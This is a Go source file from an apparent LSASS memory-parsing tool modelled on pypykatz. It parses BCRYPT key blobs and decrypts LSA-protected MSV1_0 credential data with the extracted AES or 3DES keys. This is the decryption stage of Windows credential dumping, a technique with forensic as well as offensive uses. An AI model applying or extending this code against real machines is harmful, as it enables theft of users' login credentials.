package lsasparse

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/des"
	"encoding/binary"
	"fmt"
)

// LSA crypto reference: lsasrv.dll initialises three relevant CNG
// objects at startup — InitializationVector (16-byte IV), h3DesKey
// (BCRYPT_KEY_HANDLE wrapping a 3DES session key), hAesKey
// (BCRYPT_KEY_HANDLE wrapping an AES session key). Each handle's
// underlying key bytes are stashed in a BCRYPT_KEY_DATA_BLOB header
// + raw key payload immediately reachable from the handle pointer.
//
// We don't load CNG; we mimic BCryptKeyDataBlobImport in Go by
// parsing the blob header + feeding the key bytes into crypto/aes
// or crypto/des. This is the same approach pypykatz takes via PyCA
// cryptography.
//
// References:
//   https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/ns-bcrypt-bcrypt_key_data_blob_header
//   pypykatz: pypykatz/lsadecryptor/lsa_decryptor_x64.py

// bcryptKeyDataBlobMagic is the signature CNG writes at the head of a
// BCRYPT_KEY_DATA_BLOB. Bytes "KDBM" (0x4B, 0x44, 0x42, 0x4D) read as a
// little-endian uint32 = 0x4D42444B (MSDN BCRYPT_KEY_DATA_BLOB_MAGIC).
const bcryptKeyDataBlobMagic uint32 = 0x4D42444B

// bcryptKeyDataBlobVersion is the only version CNG ships today. If
// Microsoft ever bumps it the parser will surface ErrKeyExtractFailed
// rather than silently mis-import the bytes.
const bcryptKeyDataBlobVersion uint32 = 1

// bcryptKeyDataBlobHeaderSize is sizeof(BCRYPT_KEY_DATA_BLOB_HEADER) —
// 12 bytes: dwMagic(4) + dwVersion(4) + cbKeyData(4).
const bcryptKeyDataBlobHeaderSize = 12

// lsaKey carries the three LSA crypto globals after a successful
// pattern + dereference + import sequence. Used by the MSV1_0 walker
// in phase 4 to decrypt PrimaryCredentials_data blobs.
type lsaKey struct {
	IV     []byte // 16-byte BCrypt IV (literal bytes, not a blob)
	AES    cipher.Block
	TripleDES cipher.Block
}

// parseBCryptKeyDataBlob decodes a BCRYPT_KEY_DATA_BLOB_HEADER + the
// trailing raw key payload, returning the imported cipher.Block.
//
// On a 16-byte payload we instantiate AES; on a 24-byte payload we
// instantiate 3DES. Other lengths are ErrKeyExtractFailed because the
// caller's pattern + offset must be wrong.
//
// The header layout (winnt.h):
//   ULONG dwMagic;       // BCRYPT_KEY_DATA_BLOB_MAGIC
//   ULONG dwVersion;     // BCRYPT_KEY_DATA_BLOB_VERSION1
//   ULONG cbKeyData;     // raw key length immediately after header
func parseBCryptKeyDataBlob(blob []byte) (cipher.Block, error) {
	if len(blob) < bcryptKeyDataBlobHeaderSize {
		return nil, fmt.Errorf("%w: blob shorter than BCRYPT_KEY_DATA_BLOB_HEADER (%d < %d)",
			ErrKeyExtractFailed, len(blob), bcryptKeyDataBlobHeaderSize)
	}
	magic := binary.LittleEndian.Uint32(blob[0:4])
	if magic != bcryptKeyDataBlobMagic {
		return nil, fmt.Errorf("%w: blob magic 0x%08X (want KDBM=0x%08X)",
			ErrKeyExtractFailed, magic, bcryptKeyDataBlobMagic)
	}
	version := binary.LittleEndian.Uint32(blob[4:8])
	if version != bcryptKeyDataBlobVersion {
		return nil, fmt.Errorf("%w: unsupported BCRYPT_KEY_DATA_BLOB version %d", ErrKeyExtractFailed, version)
	}
	keyLen := binary.LittleEndian.Uint32(blob[8:12])
	if uint32(len(blob)) < bcryptKeyDataBlobHeaderSize+keyLen {
		return nil, fmt.Errorf("%w: blob declares %d-byte key but only %d bytes after header",
			ErrKeyExtractFailed, keyLen, len(blob)-bcryptKeyDataBlobHeaderSize)
	}
	key := blob[bcryptKeyDataBlobHeaderSize : bcryptKeyDataBlobHeaderSize+keyLen]
	switch keyLen {
	case 16:
		return aes.NewCipher(key)
	case 24:
		return des.NewTripleDESCipher(key)
	default:
		return nil, fmt.Errorf("%w: unexpected key length %d (want 16 for AES or 24 for 3DES)",
			ErrKeyExtractFailed, keyLen)
	}
}

// decryptLSA picks the cipher based on ciphertext length and runs
// CBC decryption with the IV from the lsaKey. The heuristic mirrors
// pypykatz's: short blobs that are 8-byte aligned but not 16-byte
// aligned go through 3DES; everything else is AES. This matches how
// lsasrv encrypts MSV PrimaryCredentials data — short header structs
// with 3DES, longer per-session structs with AES.
//
// Returns a NEW slice; the input is not modified. On wrong key /
// corrupted ciphertext the output is gibberish — there is no
// authentication tag in lsasrv's CBC scheme, so callers MUST validate
// the decrypted bytes against an expected struct shape.
func decryptLSA(ct []byte, k *lsaKey) ([]byte, error) {
	if k == nil {
		return nil, fmt.Errorf("%w: nil lsaKey", ErrKeyExtractFailed)
	}
	if len(ct) == 0 {
		return nil, nil
	}
	var block cipher.Block
	switch {
	case len(ct)%16 == 0:
		if k.AES == nil {
			return nil, fmt.Errorf("%w: AES key not loaded", ErrKeyExtractFailed)
		}
		block = k.AES
	case len(ct)%8 == 0:
		if k.TripleDES == nil {
			return nil, fmt.Errorf("%w: 3DES key not loaded", ErrKeyExtractFailed)
		}
		block = k.TripleDES
	default:
		return nil, fmt.Errorf("%w: ciphertext length %d not aligned to 8 or 16", ErrKeyExtractFailed, len(ct))
	}

	if len(k.IV) < block.BlockSize() {
		return nil, fmt.Errorf("%w: IV length %d < block size %d",
			ErrKeyExtractFailed, len(k.IV), block.BlockSize())
	}
	mode := cipher.NewCBCDecrypter(block, k.IV[:block.BlockSize()])
	out := make([]byte, len(ct))
	mode.CryptBlocks(out, ct)
	return out, nil
}
